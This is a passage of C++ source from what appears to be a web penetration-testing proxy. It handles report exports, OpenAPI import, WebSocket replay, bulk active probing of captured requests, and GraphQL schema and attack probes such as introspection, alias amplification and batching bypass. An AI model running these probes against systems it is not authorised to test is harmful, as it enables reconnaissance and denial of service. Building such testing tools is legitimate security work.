        hdr += "Connection: close\r\n\r\n";
        return hdr + body;
    }

    // ---- JSON master report (machine-readable engagement bundle) -----
    // GET /api/report/json -- one payload bundling the whole engagement for CI /
    // dashboards: posture grade, OWASP+compliance coverage, host inventory, and
    // the full findings list. Composes the same shared helpers the dedicated
    // endpoints use, so the numbers match across all of them. Read-only.
    if (path == "/api/report/json") {
        const QString proj = m_wiring.projectStore
            ? m_wiring.projectStore->metadata().name : QStringLiteral("default");
        const auto findings = m_wiring.scanner
            ? m_wiring.scanner->findings(0) : QList<Nullock::Core::Finding>();
        const auto portResults = m_wiring.portScanner
            ? m_wiring.portScanner->results() : QList<Nullock::Core::PortResult>();

        const PostureGrade pg = computePostureGrade(findings);
        QJsonObject sevCounts;
        for (auto it = pg.bySeverity.constBegin(); it != pg.bySeverity.constEnd(); ++it)
            sevCounts[it.key()] = it.value();

        QJsonArray findingsArr;
        for (const auto &f : findings) {
            // Coalesce severity the same way the rollups do, so a consumer
            // bucketing findings[] matches posture/coverage/inventory.
            const QString t = f.severity.trimmed().toLower();
            findingsArr.append(QJsonObject{
                { "severity", t.isEmpty() ? QStringLiteral("info") : t }, { "kind", f.kind },
                { "summary", f.summary }, { "host", f.host }, { "url", f.url },
                { "cwe", f.cwe }, { "owasp", f.owasp },
                { "cvssScore", f.cvssScore }, { "fixSummary", f.fixSummary },
            });
        }

        return httpJson(200, QJsonObject{
            { "ok", true },
            { "project", proj },
            { "generatedAt", QDateTime::currentDateTimeUtc().toString(Qt::ISODate) },
            { "posture", QJsonObject{
                { "grade", pg.grade }, { "score", pg.score },
                { "penalty", pg.penalty }, { "bySeverity", sevCounts },
            }},
            { "coverage", computeOwaspCoverage(findings) },
            { "inventory", computeInventory(portResults, findings) },
            { "findingsTotal", findings.size() },
            { "findings", findingsArr },
        });
    }

    // ---- Built-in extensions install ---------------------------------
    // POST /api/extensions/install-builtins -- copies the extensions
    // shipped with the repo (extensions/*.js) into the user's
    // extensions dir. Removes the "go find the file in github and
    // copy it yourself" onboarding step.
    if (path == "/api/extensions/install-builtins") {
        if (!m_wiring.extensions)
            return okJson({{ "ok", false }, { "error", "no extensions wired" }});
        const QString destDir = m_wiring.extensions->extensionsDir();
        QDir().mkpath(destDir);
        // Walk our shipped extensions dir. We look for it relative to
        // uiDir (which already points at the repo's ui-v2) -- one level
        // up from there is the repo root, with extensions/ alongside.
        QString srcDir = m_wiring.uiDir + "/../extensions";
        if (!QFileInfo::exists(srcDir))
            srcDir = QCoreApplication::applicationDirPath() + "/../../../../extensions";
        if (!QFileInfo::exists(srcDir))
            return okJson({{ "ok", false }, { "error",
                "couldn't locate built-in extensions dir" }});
        QDir d(srcDir);
        const QStringList files = d.entryList({"*.js"}, QDir::Files);
        int installed = 0;
        for (const QString &f : files) {
            const QString src = d.absoluteFilePath(f);
            const QString dst = destDir + "/" + f;
            QFile::remove(dst);
            if (QFile::copy(src, dst)) ++installed;
        }
        if (m_wiring.extensions) m_wiring.extensions->reload();
        return okJson({{ "ok", true }, { "installed", installed },
                       { "destDir", destDir }});
    }

    // ---- OpenAPI / Swagger spec import -------------------------------
    // POST /api/openapi/import { spec: <JSON>, baseUrl?: "https://..." }
    // Walks paths + methods, emits one synthetic captured request per
    // operation. Lets the user see the full surface in history, fan any
    // operation out into the Repeater / Intruder, or auto-populate scope
    // from the servers list.
    if (path == "/api/openapi/import") {
        if (!m_wiring.projectStore)
            return okJson({{ "ok", false }, { "error", "no project store" }});

        QJsonValue specVal = bodyJson.value("spec");
        QJsonObject spec;
        if (specVal.isString()) {
            QJsonParseError jerr;
            const QJsonDocument d = QJsonDocument::fromJson(specVal.toString().toUtf8(), &jerr);
            if (jerr.error != QJsonParseError::NoError || !d.isObject())
                return okJson({{ "ok", false }, { "error",
                                                  "spec is not valid JSON: " + jerr.errorString() }});
            spec = d.object();
        } else if (specVal.isObject()) {
            spec = specVal.toObject();
        } else {
            return okJson({{ "ok", false }, { "error", "spec missing or wrong type" }});
        }

        // Decide base URL. Override > spec.servers[0].url > spec.host+basePath.
        QString baseUrlOverride = bodyJson.value("baseUrl").toString();
        QString baseUrl;
        if (!baseUrlOverride.isEmpty()) {
            baseUrl = baseUrlOverride;
        } else if (spec.contains("servers")) {
            const QJsonArray servers = spec.value("servers").toArray();
            if (!servers.isEmpty())
                baseUrl = servers.first().toObject().value("url").toString();
        } else if (spec.contains("host")) {
            const QString scheme = spec.value("schemes").toArray().isEmpty()
                ? QStringLiteral("https")
                : spec.value("schemes").toArray().first().toString("https");
            baseUrl = scheme + "://" + spec.value("host").toString()
                            + spec.value("basePath").toString();
        }
        if (baseUrl.isEmpty())
            return okJson({{ "ok", false }, { "error",
                                              "no base URL found (set baseUrl in body or include servers[]/host)" }});
        // Normalize: drop trailing slash so concatenation is clean.
        while (baseUrl.endsWith('/')) baseUrl.chop(1);

        const QUrl burl(baseUrl);
        const QString hostStr = burl.host();
        const bool useTls    = (burl.scheme().compare("https", Qt::CaseInsensitive) == 0);
        const int  portInt   = burl.port(useTls ? 443 : 80);

        const QJsonObject paths = spec.value("paths").toObject();
        int imported = 0;
        static const QStringList kMethods = {
            "get", "put", "post", "delete", "options", "head", "patch", "trace"
        };

        for (auto it = paths.constBegin(); it != paths.constEnd(); ++it) {
            const QString rawPath = it.key();
            const QJsonObject pathItem = it.value().toObject();
            // Path-level params would apply to every operation -- we don't
            // model them separately; per-op overrides them anyway.

            for (const QString &m : kMethods) {
                if (!pathItem.contains(m)) continue;
                const QJsonObject op = pathItem.value(m).toObject();

                // Substitute path templates {paramName} with the param's
                // example value (or "1" as a generic placeholder for the
                // path-param `userId`/`id` shape).
                QString finalPath = rawPath;
                const QJsonArray params = op.value("parameters").toArray();
                QHash<QString, QString> queryParams;
                QHash<QString, QString> headerParams;
                QString bodyJsonStr;
                QString bodyCT;
                for (const QJsonValue &pv : params) {
                    const QJsonObject p = pv.toObject();
                    const QString in   = p.value("in").toString();
                    const QString name = p.value("name").toString();
                    QString val = p.value("example").toVariant().toString();
                    if (val.isEmpty()) val = p.value("default").toVariant().toString();
                    if (val.isEmpty()) {
                        const QString type = p.value("schema").toObject().value("type").toString(
                                                p.value("type").toString());
                        if (type == "integer" || type == "number") val = "1";
                        else if (type == "boolean") val = "true";
                        else val = "{{" + name + "}}";  // ready for session-rules injection
                    }
                    if (in == "path") {
                        finalPath.replace("{" + name + "}", val);
                    } else if (in == "query") {
                        queryParams.insert(name, val);
                    } else if (in == "header") {
                        headerParams.insert(name, val);
                    } else if (in == "body") {
                        // OpenAPI v2 body parameter. The example can be
                        // an object, array, string, or number; handle
                        // them all rather than blindly toObject().
                        const QJsonValue ex = p.value("schema").toObject().value("example");
                        if (ex.isObject()) {
                            bodyJsonStr = QString::fromUtf8(
                                QJsonDocument(ex.toObject()).toJson(QJsonDocument::Compact));
                        } else if (ex.isArray()) {
                            bodyJsonStr = QString::fromUtf8(
                                QJsonDocument(ex.toArray()).toJson(QJsonDocument::Compact));
                        } else if (ex.isString()) {
                            bodyJsonStr = ex.toString();
                        } else if (ex.isDouble()) {
                            bodyJsonStr = QString::number(ex.toDouble());
                        } else if (ex.isBool()) {
                            bodyJsonStr = ex.toBool() ? "true" : "false";
                        }
                    }
                }
                // OpenAPI v3 requestBody
                if (op.contains("requestBody")) {
                    const QJsonObject rb = op.value("requestBody").toObject();
                    const QJsonObject content = rb.value("content").toObject();
                    for (auto cit = content.constBegin(); cit != content.constEnd(); ++cit) {
                        bodyCT = cit.key();
                        const QJsonObject example = cit.value().toObject().value("example").toObject();
                        if (!example.isEmpty()) {
                            bodyJsonStr = QString::fromUtf8(QJsonDocument(example).toJson(
                                                                QJsonDocument::Compact));
                        }
                        break;  // first content type wins
                    }
                }

                // Build full target path with query string.
                if (!queryParams.isEmpty()) {
                    QStringList parts;
                    for (auto qit = queryParams.cbegin(); qit != queryParams.cend(); ++qit) {
                        parts << (qit.key() + "="
                            + QString::fromUtf8(QUrl::toPercentEncoding(qit.value())));
                    }
                    finalPath += "?" + parts.join("&");
                }

                Nullock::Proxy::HttpRequest req;
                req.timestamp = QDateTime::currentDateTime();
                req.method      = m.toUpper();
                req.httpVersion = "HTTP/1.1";
                req.target      = finalPath;
                req.path        = finalPath;
                req.host        = hostStr;
                req.port        = static_cast<quint16>(portInt);
                req.headers.append({ "Host", hostStr });
                for (auto hit = headerParams.cbegin(); hit != headerParams.cend(); ++hit)
                    req.headers.append({ hit.key(), hit.value() });
                if (!bodyJsonStr.isEmpty()) {
                    req.headers.append({ "Content-Type",
                                         bodyCT.isEmpty() ? QString("application/json") : bodyCT });
                    req.body = bodyJsonStr.toUtf8();
                    req.headers.append({ "Content-Length",
                                         QString::number(req.body.size()) });
                }

                Nullock::Proxy::HttpResponse resp;
                resp.httpVersion  = "HTTP/1.1";
                resp.statusCode   = 0;
                resp.reasonPhrase = "OpenAPI imported (not yet sent)";
                resp.wasTls       = useTls;

                // appendEntry persists; entryLoaded signal updates the
                // GUI proxy model live.
                m_wiring.projectStore->appendEntry(req, resp);
                emit m_wiring.projectStore->entryLoaded(req, resp);
                ++imported;
            }
        }

        return okJson({
            { "ok",       true },
            { "imported", imported },
            { "host",     hostStr },
            { "baseUrl",  baseUrl },
        });
    }

    // ---- WebSocket Repeater ------------------------------------------
    // POST /api/ws/send { sessionId, direction: "up"|"down", opcode: 0-15, payload: str|null }
    // payload is interpreted as text for opcode 0x1, and as base64 for
    // 0x2 (binary). Other opcodes ignore payload.
    if (path == "/api/ws/send") {
        const qint64  sid  = bodyJson.value("sessionId").toVariant().toLongLong();
        const QString dir  = bodyJson.value("direction").toString();
        const int     op   = bodyJson.value("opcode").toInt(0x1);  // default text
        QByteArray payload;
        if (bodyJson.contains("payload")) {
            const QJsonValue v = bodyJson.value("payload");
            if (v.isString()) {
                if (op == 0x2) payload = QByteArray::fromBase64(v.toString().toLatin1());
                else           payload = v.toString().toUtf8();
            }
        }
        const bool ok = Nullock::Proxy::WsRepeater::instance()->sendFrame(
            sid, dir, op, payload);
        return okJson({{ "ok", ok }});
    }

    if (path == "/api/theme") {
        if (m_wiring.themes)
            m_wiring.themes->setCurrentTheme(bodyJson.value("name").toString());
        return okJson();
    }

    if (path == "/api/theme/save-as") {
        if (!m_wiring.themes) return okJson({{ "ok", false }});
        const QString name = bodyJson.value("name").toString();
        const QJsonObject colors = bodyJson.value("colors").toObject();
        QVariantMap colorMap;
        for (auto it = colors.constBegin(); it != colors.constEnd(); ++it)
            colorMap.insert(it.key(), it.value().toString());
        const bool ok = m_wiring.themes->saveTheme(name, colorMap);
        return okJson({
            { "saved", ok },
            { "current", m_wiring.themes->currentTheme() },
        });
    }

    if (path == "/api/theme/reload") {
        if (m_wiring.themes) m_wiring.themes->reload();
        return okJson();
    }

    if (path == "/api/har/export") {
        QString out;
        if (m_wiring.projectStore) {
            // Allow callers to override redaction with a body flag, but
            // default-on so a user clicking "Export HAR" doesn't have to
            // remember to opt into safety.
            const bool wasRedact = m_wiring.projectStore->exportRedact();
            if (bodyJson.contains("redact"))
                m_wiring.projectStore->setExportRedact(bodyJson.value("redact").toBool(true));
            out = m_wiring.projectStore->exportHar(QString());
            m_wiring.projectStore->setExportRedact(wasRedact);
        }
        return okJson({{ "path", out }});
    }
    if (path == "/api/har/import") {
        int n = -1;
        if (m_wiring.projectStore) {
            const QString p = bodyJson.value("path").toString();
            if (!p.isEmpty()) {
                n = m_wiring.projectStore->importHar(p);
            } else if (bodyJson.contains("har")) {
                // Caller posted the raw HAR object instead of a path.
                const QByteArray bytes =
                    QJsonDocument(bodyJson.value("har").toObject()).toJson(QJsonDocument::Compact);
                n = m_wiring.projectStore->importHarBytes(bytes);
            }
        }
        return okJson({
            { "imported", n },
            { "ok", n >= 0 },
        });
    }

    if (path == "/api/clear-history") {
        if (m_wiring.history) m_wiring.history->clear();
        return okJson();
    }

    if (path == "/api/mitm/clear-blocked") {
        if (m_wiring.proxy) m_wiring.proxy->clearMitmBlocked();
        return okJson();
    }

    if (path == "/api/extensions/reload") {
        if (m_wiring.extensions) m_wiring.extensions->reload();
        return okJson({{ "loaded", m_wiring.extensions ? m_wiring.extensions->loadedCount() : 0 }});
    }

    if (path == "/api/findings/clear") {
        if (m_wiring.scanner) m_wiring.scanner->clear();
        return okJson();
    }

    // ---- tool-integration exports ------------------------------------
    // GET /api/export/nmap-xml  -> port scan results as nmap-compatible XML
    if (path == "/api/export/nmap-xml") {
        if (!m_wiring.portScanner)
            return httpResponse(404, "text/plain", "no port scanner");
        QByteArray xml;
        xml += "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n";
        xml += "<!DOCTYPE nmaprun>\n";
        xml += "<?xml-stylesheet href=\"https://nmap.org/svn/docs/nmap.xsl\" type=\"text/xsl\"?>\n";
        xml += "<nmaprun scanner=\"nullock\" args=\"nullock --port-scan\" "
               "start=\"" + QByteArray::number(QDateTime::currentSecsSinceEpoch()) + "\" "
               "version=\"" + "1.0" + "\" "
               "xmloutputversion=\"1.05\">\n";
        // Group results by host so the XML is nmap-shaped.
        QMap<QString, QList<Nullock::Core::PortResult>> byHost;
        for (const auto &r : m_wiring.portScanner->results())
            byHost[r.host].append(r);
        auto xmlEscape = [](const QString &s) {
            // Replace control chars first so they don't survive as raw
            // bytes inside an attribute -- many XML parsers reject CR/LF
            // in attribute values (or silently mangle them).
            QString cleaned;
            cleaned.reserve(s.size());
            for (QChar c : s) {
                const ushort u = c.unicode();
                if (u == '\n' || u == '\r' || u == '\t') cleaned.append(' ');
                else if (u < 0x20) cleaned.append(' ');
                else cleaned.append(c);
            }
            return cleaned.toUtf8()
                    .replace('&', "&amp;").replace('<', "&lt;")
                    .replace('>', "&gt;").replace('"', "&quot;")
                    .replace('\'', "&apos;");
        };
        for (auto it = byHost.constBegin(); it != byHost.constEnd(); ++it) {
            const QString host = it.key();
            xml += "  <host>\n";
            xml += "    <address addr=\"" + xmlEscape(host) + "\" addrtype=\"ipv4\"/>\n";
            // <hostnames> if the input was a name not an IP -- best effort.
            if (!host.isEmpty() && !host[0].isDigit())
                xml += "    <hostnames><hostname name=\"" + xmlEscape(host)
                     + "\" type=\"user\"/></hostnames>\n";
            xml += "    <ports>\n";
            for (const auto &r : it.value()) {
                xml += "      <port protocol=\"tcp\" portid=\""
                     + QByteArray::number(r.port) + "\">\n";
                xml += "        <state state=\"" + xmlEscape(r.status)
                     + "\" reason=\"" + (r.status == "open" ? "syn-ack"
                                       : r.status == "closed" ? "conn-refused"
                                       : "no-response") + "\"/>\n";
                if (!r.service.isEmpty()) {
                    xml += "        <service name=\"" + xmlEscape(r.service) + "\"";
                    if (!r.banner.isEmpty())
                        xml += " banner=\"" + xmlEscape(r.banner.left(80)) + "\"";
                    xml += "/>\n";
                }
                xml += "      </port>\n";
            }
            xml += "    </ports>\n";
            xml += "  </host>\n";
        }
        xml += "  <runstats>\n";
        xml += "    <finished time=\"" + QByteArray::number(QDateTime::currentSecsSinceEpoch())
             + "\" elapsed=\"0\"/>\n";
        xml += "    <hosts up=\"" + QByteArray::number(byHost.size())
             + "\" down=\"0\" total=\"" + QByteArray::number(byHost.size()) + "\"/>\n";
        xml += "  </runstats>\n";
        xml += "</nmaprun>\n";
        return httpResponse(200, "application/xml; charset=utf-8", xml);
    }

    // GET /api/export/sarif  -> findings as SARIF v2 (CI-friendly)
    if (path == "/api/export/sarif") {
        if (!m_wiring.scanner)
            return httpResponse(404, "application/json", "{}");
        QJsonObject root;
        root["$schema"] = "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0.json";
        root["version"] = "2.1.0";
        QJsonObject driver;
        driver["name"]   = "Nullock";
        driver["informationUri"] = "https://github.com/Bikebrainz/Nullock";
        QJsonArray rules;
        // Collect unique kinds to populate the rules array.
        QSet<QString> seenKinds;
        for (const auto &f : m_wiring.scanner->findings(1000)) {
            if (seenKinds.contains(f.kind)) continue;
            seenKinds.insert(f.kind);
            QJsonObject rule;
            rule["id"] = f.kind;
            QJsonObject shortDesc;
            shortDesc["text"] = f.kind;
            rule["shortDescription"] = shortDesc;
            rules.append(rule);
        }
        driver["rules"] = rules;
        QJsonObject tool;
        tool["driver"] = driver;
        QJsonObject run;
        run["tool"] = tool;
        QJsonArray results;
        for (const auto &f : m_wiring.scanner->findings(1000)) {
            QJsonObject result;
            result["ruleId"] = f.kind;
            QString sarifLevel = "warning";
            if (f.severity == "high")   sarifLevel = "error";
            if (f.severity == "low")    sarifLevel = "note";
            if (f.severity == "info")   sarifLevel = "note";
            result["level"]  = sarifLevel;
            QJsonObject msg;
            msg["text"] = f.summary + (f.evidence.isEmpty() ? QString() : "\n\n" + f.evidence);
            result["message"] = msg;
            QJsonArray locations;
            QJsonObject location;
            QJsonObject physical;
            QJsonObject artifact;
            artifact["uri"] = f.url;
            physical["artifactLocation"] = artifact;
            location["physicalLocation"] = physical;
            locations.append(location);
            result["locations"] = locations;
            results.append(result);
        }
        run["results"] = results;
        QJsonArray runs; runs.append(run);
        root["runs"] = runs;
        return httpResponse(200, "application/sarif+json; charset=utf-8",
                            QJsonDocument(root).toJson(QJsonDocument::Indented));
    }

    // GET /api/export/sbom  -> CycloneDX 1.5 SBOM. Components come from detected
    // technologies (fingerprint) + the products named in CVE correlations;
    // vulnerabilities come from cve-correlated findings, linked to their
    // component. A supply-chain / compliance artifact Burp doesn't produce.
    // Read-only aggregation of existing findings.
    if (path == "/api/export/sbom") {
        if (!m_wiring.scanner)
            return httpResponse(404, "application/json", "{}");

        const QString proj = m_wiring.projectStore
            ? m_wiring.projectStore->metadata().name : QStringLiteral("default");

        // Component registry keyed by "name@version" so tech-detected and
        // cve-correlated findings naming the same product share one bom-ref.
        struct Comp { QString name, version; };
        QMap<QString, Comp> comps;
        // bom-ref is case-folded so "nginx" and "Nginx" share one component and
        // a vuln's affects[].ref resolves regardless of source casing.
        auto refFor = [](const QString &name, const QString &version) {
            const QString n = name.toLower();
            return version.isEmpty() ? n : n + "@" + version;
        };
        auto addComp = [&](const QString &name, const QString &version) -> QString {
            if (name.isEmpty()) return QString();
            const QString key = refFor(name, version);
            if (!comps.contains(key)) comps.insert(key, { name, version });
            return key;
        };

        QRegularExpression reCve(QStringLiteral("CVE-\\d{4}-\\d{4,}"));
        // "<product> <version>" anchored at the start of a candidate substring.
        QRegularExpression reProd(QStringLiteral("^([A-Za-z][\\w.+\\-]*)\\s+([0-9][\\w.]*)"));
        // Split a trailing version off a tech name: "Microsoft IIS 10.0" ->
        // ("Microsoft IIS", "10.0"); "WordPress" -> ("WordPress", "").
        QRegularExpression reTrailVer(QStringLiteral("^(.*?)\\s+([0-9][\\w.]*)$"));
        // cve-correlated summaries come in several shapes. Extract product+version
        // ONLY from a known structured position, never from free-text advisory
        // prose (which would mint junk components like "before@2.15.0"):
        //   "CVE.. in <prod> <ver> -- .."      (assess)         -> after " in "
        //   "CVE.. — <prod> <ver> on h:p" (scan bridge)    -> after " — "
        //   "CVE.. on h:p (<prod> <ver>) -- .."(servicevulns)   -> inside ( )
        //   "CVE..: <free prose>"              (passive)        -> NO product
        QRegularExpression reF4(QStringLiteral("^CVE-\\d{4}-\\d{4,}:\\s"));
        auto parseProduct = [&](const QString &summary, QString &prod, QString &ver) -> bool {
            if (reF4.match(summary).hasMatch()) return false;  // prose -> no product
            QStringList cands;
            int idx;
            if ((idx = summary.indexOf(QStringLiteral(" in "))) >= 0)
                cands << summary.mid(idx + 4);
            if ((idx = summary.indexOf(QStringLiteral(" — "))) >= 0)
                cands << summary.mid(idx + 3);   // " <em-dash> " is 3 UTF-16 units
            const int lp = summary.indexOf('(');
            const int rp = lp >= 0 ? summary.indexOf(')', lp + 1) : -1;
            if (lp >= 0 && rp > lp) cands << summary.mid(lp + 1, rp - lp - 1);
            for (const QString &c : cands) {
                const auto m = reProd.match(c.trimmed());
                if (m.hasMatch()) { prod = m.captured(1); ver = m.captured(2); return true; }
            }
            return false;
        };

        QJsonArray vulns;
        for (const auto &f : m_wiring.scanner->findings(0)) {
            if (f.kind == QLatin1String("tech-detected")) {
                QString s = f.summary;
                if (s.startsWith(QLatin1String("Detected "))) s = s.mid(9);
                s = s.trimmed();
                QString name = s, version;
                const auto m = reTrailVer.match(s);
                if (m.hasMatch()) { name = m.captured(1).trimmed(); version = m.captured(2); }
                addComp(name, version);
            } else if (f.kind == QLatin1String("cve-correlated")) {
                const auto cm = reCve.match(f.summary);
                if (!cm.hasMatch()) continue;
                const QString cveId = cm.captured(0);
                QString prod, ver;
                parseProduct(f.summary, prod, ver);
                const QString ref = addComp(prod, ver);

                QJsonObject vuln;
                vuln["id"] = cveId;
                vuln["source"] = QJsonObject{
                    { "name", "NVD" },
                    { "url", "https://nvd.nist.gov/vuln/detail/" + cveId },
                };
                if (f.cvssScore > 0.0) {
                    QJsonObject rating{
                        { "score", f.cvssScore },
                        { "severity", f.severity.toLower() },
                        { "method", f.cvssVector.startsWith("CVSS:3.1") ? "CVSSv31" : "CVSSv3" },
                    };
                    if (!f.cvssVector.isEmpty()) rating["vector"] = f.cvssVector;
                    vuln["ratings"] = QJsonArray{ rating };
                }
                vuln["description"] = f.summary;
                if (!ref.isEmpty())
                    vuln["affects"] = QJsonArray{ QJsonObject{{ "ref", ref }} };
                vulns.append(vuln);
            }
        }

        QJsonArray comparr;
        for (auto it = comps.constBegin(); it != comps.constEnd(); ++it) {
            QJsonObject c{
                { "type", "application" },
                { "bom-ref", it.key() },
                { "name", it.value().name },
            };
            if (!it.value().version.isEmpty()) c["version"] = it.value().version;
            comparr.append(c);
        }

        QJsonObject toolc{ { "vendor", "Bikebrainz" }, { "name", "Nullock" } };
        const QString appVer = QCoreApplication::applicationVersion();
        if (!appVer.isEmpty()) toolc["version"] = appVer;

        QJsonObject meta{
            { "timestamp", QDateTime::currentDateTimeUtc().toString(Qt::ISODate) },
            { "tools", QJsonArray{ toolc } },
            { "component", QJsonObject{{ "type", "application" }, { "name", proj }} },
        };
        QJsonObject root{
            { "bomFormat", "CycloneDX" },
            { "specVersion", "1.5" },
            { "serialNumber", "urn:uuid:" + QUuid::createUuid().toString(QUuid::WithoutBraces) },
            { "version", 1 },
            { "metadata", meta },
            { "components", comparr },
        };
        if (!vulns.isEmpty()) root["vulnerabilities"] = vulns;

        return httpResponse(200, "application/vnd.cyclonedx+json; charset=utf-8",
                            QJsonDocument(root).toJson(QJsonDocument::Indented));
    }

    // GET /api/export/postman  -> current history as a Postman collection
    // ?raw=1 disables the sensitive-header redaction (default-on so a
    // user sharing this with another human doesn't accidentally ship
    // their session cookies).
    if (path == "/api/export/postman") {
        if (!m_wiring.history)
            return httpResponse(404, "application/json", "{}");
        bool redact = true;
        {
            const QUrlQuery q(query);
            if (q.queryItemValue("raw") == "1") redact = false;
        }
        // Mirror project_store.cpp::isSensitiveHeader -- same set, kept
        // in sync deliberately so a single header policy covers all
        // export paths.
        static const QSet<QString> kSensitive = {
            "authorization", "proxy-authorization", "cookie", "set-cookie",
            "x-api-key", "x-auth-token", "x-csrf-token", "x-xsrf-token",
            "x-session-id", "x-amz-security-token",
            "x-goog-iam-authorization-token",
        };
        QJsonObject info;
        info["name"] = m_wiring.projectStore
                          ? "Nullock · " + m_wiring.projectStore->metadata().name
                          : QString("Nullock export");
        info["schema"] = "https://schema.getpostman.com/json/collection/v2.1.0/collection.json";
        QJsonArray items;
        // Iterate by id via HistoryIndex when available so exports cover
        // the full captured history, not just the in-memory window.
        // Falls back to the windowed model when SQLite isn't open.
        QList<int> ids;
        auto *fullIdx = m_wiring.projectStore
                            ? m_wiring.projectStore->historyIndex()
                            : nullptr;
        if (fullIdx && fullIdx->isOpen()) {
            ids = fullIdx->allIds();
        } else {
            const int n = m_wiring.history->rowCount();
            for (int i = 0; i < n; ++i) {
                const auto *r = m_wiring.history->requestAt(i);
                if (r) ids.append(m_wiring.history->firstId() + i);
            }
        }
        Nullock::Proxy::HttpRequest  scratchReq;
        Nullock::Proxy::HttpResponse scratchResp;
        for (int id : ids) {
            const Nullock::Proxy::HttpRequest  *req  = m_wiring.history->requestById(id);
            const Nullock::Proxy::HttpResponse *resp = m_wiring.history->responseById(id);
            if (!req && fullIdx && fullIdx->isOpen()) {
                auto fr = fullIdx->loadFullRow(id);
                if (fr.ok) {
                    scratchReq  = std::move(fr.request);
                    scratchResp = std::move(fr.response);
                    req  = &scratchReq;
                    resp = &scratchResp;
                }
            }
            if (!req) continue;
            if (req->method.startsWith("WS")) continue;
            QJsonObject item;
            item["name"] = req->method + " " + req->path;
            QJsonObject requestObj;
            requestObj["method"] = req->method;
            QJsonArray hdrs;
            for (const auto &h : req->headers) {
                const QString k = h.first;
                const QString lc = k.toLower();
                if (lc == "host" || lc == "content-length" || lc == "proxy-connection") continue;
                QJsonObject hh;
                hh["key"] = k;
                if (redact && kSensitive.contains(lc)) {
                    hh["value"] = QString("<redacted: %1 chars>").arg(h.second.size());
                } else {
                    hh["value"] = h.second;
                }
                hdrs.append(hh);
            }
            requestObj["header"] = hdrs;
            if (!req->body.isEmpty()) {
                QJsonObject body;
                body["mode"] = "raw";
                body["raw"]  = QString::fromUtf8(req->body);
                requestObj["body"] = body;
            }
            const bool tls = resp ? resp->wasTls : false;
            const QString proto = tls ? "https" : "http";
            const int defaultPort = tls ? 443 : 80;
            const QString port = (req->port == defaultPort)
                                 ? QString() : ":" + QString::number(req->port);
            QJsonObject url;
            url["raw"] = proto + "://" + req->host + port + req->path;
            requestObj["url"] = url;
            item["request"] = requestObj;
            items.append(item);
        }
        QJsonObject root;
        root["info"] = info;
        root["item"] = items;
        return httpResponse(200, "application/json; charset=utf-8",
                            QJsonDocument(root).toJson(QJsonDocument::Indented));
    }

    // POST /api/probe/all  { throttleMs?: 200, limit?: 50 }
    // Walks every history row that has query-string params and fires the
    // same active probe pipeline. Defaults to 200ms throttle so a casual
    // user doesn't accidentally DoS a target.
    if (path == "/api/probe/all") {
        if (!m_wiring.history || !m_wiring.proxy)
            return okJson({{ "ok", false }});
        const int throttleMs = bodyJson.value("throttleMs").toInt(200);
        const int limit      = bodyJson.value("limit").toInt(50);
        QList<int> rowIds;
        const int rc = m_wiring.history->rowCount();
        for (int i = rc - 1; i >= 0 && rowIds.size() < limit; --i) {
            const auto *r = m_wiring.history->requestAt(i);
            if (!r) continue;
            if (r->method.startsWith("WS")) continue;
            const int q = r->path.indexOf('?');
            if (q < 0) continue;
            const QString query = r->path.mid(q + 1);
            if (query.isEmpty()) continue;
            rowIds.append(i + 1);  // 1-based ids match snapshot rows
        }
        if (rowIds.isEmpty()) return okJson({{ "queued", 0 }});

        // Fire probes serially with throttle, off-thread so the response
        // returns immediately and the snapshot poll surfaces findings as
        // they land. We post synthetic POSTs to our own /probe endpoint
        // rather than duplicating the inner probe loop -- that way any
        // future improvements to the probe pipeline get picked up here
        // for free.
        const quint16 myPort = this->listeningPort();
        (void)QtConcurrent::run([myPort, rowIds, throttleMs]() {
            for (int rowId : rowIds) {
                QTcpSocket sock;
                sock.connectToHost(QHostAddress::LocalHost, myPort);
                if (!sock.waitForConnected(2000)) continue;
                const QByteArray req =
                    "POST /api/history/" + QByteArray::number(rowId) +
                    "/probe HTTP/1.1\r\n"
                    "Host: 127.0.0.1\r\n"
                    "Content-Length: 0\r\n"
                    "Connection: close\r\n\r\n";
                sock.write(req);
                sock.waitForBytesWritten(1000);
                sock.waitForReadyRead(1000);
                sock.disconnectFromHost();
                if (throttleMs > 0) QThread::msleep(static_cast<unsigned long>(throttleMs));
            }
        });
        return okJson({{ "queued", rowIds.size() }});
    }

    // ---- GraphQL active probe ----------------------------------------
    // POST /api/graphql/probe  { url, headers?: {Name: Value, ...} }
    //
    // Fires five distinct GraphQL attack probes against the target and
    // emits one finding per real hit. Burp Pro has a separate add-on
    // ($ extra) for this; we ship it native.
    //
    // Probes:
    //   1. Introspection enabled — fires the standard __schema query and
    //      flags if the server returns schema data in production.
    //   2. Field suggestion leak — sends a deliberate typo; if the
    //      response includes "Did you mean ...?" the server is leaking
    //      schema fragments even with introspection off.
    //   3. Alias-based amplification — fires 100 identical aliased
    //      fields in one query; if the server accepts it the endpoint
    //      lacks alias-count limits and is exposed to query-amplification
    //      DoS / auth-rate-limit bypass.
    //   4. Query-depth bypass — fires a nested query 10 levels deep; if
    //      accepted, depth limits are missing.
    //   5. Batched-query bypass — fires [{q1}, {q2}, ...] array form; if
    //      the server processes both, rate limiting can be batch-bypassed.
    // ---- GraphQL schema analysis -------------------------------------
    // POST /api/graphql/schema { url, headers? }
    //   When introspection is on, fetch the schema and analyse it for the
    //   attack surface Burp doesn't: dangerous mutations (delete/grant/
    //   impersonate/...) and sensitive fields (password/token/ssn/...).
    if (path == "/api/graphql/schema") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});
        const QString host = u.host();
        const int port = u.port(u.scheme() == "https" ? 443 : 80);
        const bool tls = (u.scheme() == "https");
        const QString gpath = u.path(QUrl::FullyEncoded).isEmpty()
                              ? QStringLiteral("/graphql") : u.path(QUrl::FullyEncoded);

        // Minimal introspection: type names + their fields, and which type
        // is the mutation root.
        const QByteArray q =
            R"({"query":"query{__schema{mutationType{name} queryType{name} types{name kind fields{name}}}}"})";
        QByteArray req;
        req  = "POST " + gpath.toUtf8() + " HTTP/1.1\r\n";
        req += "Host: " + host.toUtf8() + "\r\n";
        req += "User-Agent: Nullock/graphql-schema\r\n";
        req += "Content-Type: application/json\r\nAccept: application/json\r\n";
        req += "Accept-Encoding: identity\r\n";
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it) {
            // Reject CR/LF in header name/value -- it would split the request.
